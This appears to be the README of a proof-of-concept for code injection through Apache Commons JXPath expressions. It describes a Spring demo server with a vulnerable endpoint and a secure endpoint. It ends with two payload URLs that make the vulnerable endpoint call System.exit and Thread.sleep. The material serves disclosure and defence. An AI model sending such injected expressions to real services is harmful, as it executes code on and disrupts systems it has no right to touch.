## Vulnerability Description
JXPath library has support for running functions in XPath expressions 
(see [Official User Guide](https://commons.apache.org/proper/commons-jxpath/users-guide.html#Standard_Extension_Functions)).

For example, methods `JXPathContext.getValue(path)` and `JXPathContext.iterate(path)` are dangerous 
if you let user send input into the path parameter.

## PoC Description
This PoC starts simple Spring server with two endpoints:

- `/vulnerable-example?path=[path]`
- `/secure-example?path=[path]`

These endpoints have only one query parameter "path". 

### Possible Request URLs
Following requests will work fine (will not cause any problems):
- http://localhost:8080/secure-example?path=name
- http://localhost:8080/secure-example?path=website
- http://localhost:8080/secure-example?path=/
- http://localhost:8080/vulnerable-example?path=name
- http://localhost:8080/vulnerable-example?path=website
- http://localhost:8080/vulnerable-example?path=/

Following requests will cause code to be executed:
- http://localhost:8080/vulnerable-example?path=java.lang.System.exit(42)
- http://localhost:8080/vulnerable-example?path=java.lang.Thread.sleep(10000)
